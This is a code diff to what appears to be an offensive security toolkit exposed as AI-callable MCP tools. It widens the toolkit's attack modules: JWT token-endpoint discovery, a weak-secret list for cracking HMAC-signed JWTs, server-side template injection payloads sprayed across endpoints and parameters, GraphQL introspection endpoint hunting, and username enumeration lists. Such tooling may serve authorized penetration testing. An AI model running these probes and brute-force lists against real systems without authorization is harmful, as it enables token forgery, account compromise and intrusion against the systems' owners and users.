@@ -154,7 +154,14 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
         token = jwt_token.strip() if jwt_token else ""
         if not token:
             import socket as _sock
-            for path in ["/api/auth/login", "/login", "/auth", "/api/token"]:
+            # Phase 4: expanded discovery paths (Keycloak, WordPress, OAuth)
+            for path in [
+                "/api/auth/login", "/login", "/auth", "/api/token",
+                "/api/v1/login", "/signin", "/oauth/token", "/api/me",
+                "/api/session", "/api/auth/token", "/api/access-token",
+                "/auth/realms/master/protocol/openid-connect/token",
+                "/wp-json/jwt-auth/v1/token", "/.well-known/openid-configuration",
+            ]:
                 try:
                     with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                         s.settimeout(5)
@@ -208,7 +215,15 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
         alg = header.get("alg", "")
         if alg.startswith("HS"):
             hash_name = alg.replace("HS", "sha")
-            secrets = ["secret", "key", "jwt_secret", "private_key", "changeme", "password", "123456", "admin"]
+            # Phase 4: expanded weak-secret list (rockyou-top / jwt-secrets style)
+            secrets = [
+                "secret", "key", "jwt_secret", "private_key", "changeme", "password",
+                "123456", "admin", "secret_key", "jwt-secret", "token", "auth",
+                "supersecret", "qwerty", "letmein", "welcome", "administrator",
+                "api_secret", "flask-secret", "django-insecure-", "node", "nodejs",
+                "express", "nextauth", "supabase", "firebase", "prod", "staging",
+                "dev", "test", "12345678", "password123", "secret123", "changethis",
+            ]
             found_secrets = []
             for secret in secrets:
                 try:
@@ -254,10 +269,25 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
             ("<%= 7*7 %>", "49", "ERB/Ruby"),
             ("{{=7*7}}", "49", "Mako"),
             ("{7*7}", "49", "Smarty"),
+            # Phase 4: additional engines + disambiguators
+            ("<{7*7}>", "49", "StringTemplate"),
+            ("{{7*'7'}}", "4977", "DotLiquid/Jinja2"),
+            ("{% debug %}", "debug", "Pebble/Twig"),
+            ("{{this.constructor.constructor('return 7')()}}", "7", "Handlebars"),
         ]
 
-        endpoints = ["/", "/search", "/profile", "/user", "/page", "/render", "/preview"]
-        params = ["q", "search", "name", "username", "id", "page", "input", "data"]
+        endpoints = [
+            "/", "/search", "/profile", "/user", "/page", "/render", "/preview",
+            # Phase 4: template-render-heavy endpoints
+            "/api/render", "/template", "/message", "/comment", "/email/preview",
+            "/format", "/eval", "/compile", "/v1/render", "/admin/template",
+        ]
+        params = [
+            "q", "search", "name", "username", "id", "page", "input", "data",
+            # Phase 4: template/body params
+            "template", "body", "content", "message", "text", "html",
+            "subject", "recipient", "to", "from", "title",
+        ]
 
         found_engine = None
         for ep in endpoints:
@@ -306,7 +336,12 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
             query { __schema { queryType { name } mutationType { name } types { name kind description fields { name } } } }
         """})
 
-        endpoints = ["/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query"]
+        endpoints = [
+            "/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query",
+            # Phase 4: expanded GraphQL surface
+            "/api/v1/graphql", "/public/graphql", "/graphql/schema",
+            "/api/schema", "/__graphql", "/api", "/graphql/batch", "/g",
+        ]
         found = None
 
         for ep in endpoints:
@@ -632,6 +667,13 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
             "admin", "administrator", "root", "user", "test", "guest",
             "info", "support", "sales", "marketing", "hr", "finance",
             "manager", "developer", "dev", "ops", "backup", "service",
+            # Phase 4: service accounts, cloud defaults, app defaults
+            "sql", "oracle", "sa", "postgres", "redis", "mongo",
+            "cassandra", "elastic", "kibana", "jenkins", "gitlab", "grafana",
+            "jira", "confluence", "svc_account", "svc_web", "svc_db",
+            "ec2-user", "ssm-user", "centos", "fedora", "ubuntu",
+            "sysadmin", "operator", "audit", "security", "readonly",
+            "reports", "backup_admin",
         ]
 
         found = []
